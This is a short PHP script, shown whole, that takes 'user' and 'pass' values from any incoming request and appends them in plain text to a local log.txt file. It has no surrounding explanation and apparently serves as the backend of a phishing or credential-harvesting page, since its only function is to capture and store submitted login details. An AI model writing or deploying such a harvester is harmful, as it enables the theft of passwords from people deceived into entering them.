<?php
$user = $_REQUEST['user'];
$pass = $_REQUEST['pass'];
file_put_contents('log.txt',"\nuser: ".$user."\n"."pass: ".$pass,FILE_APPEND);
?>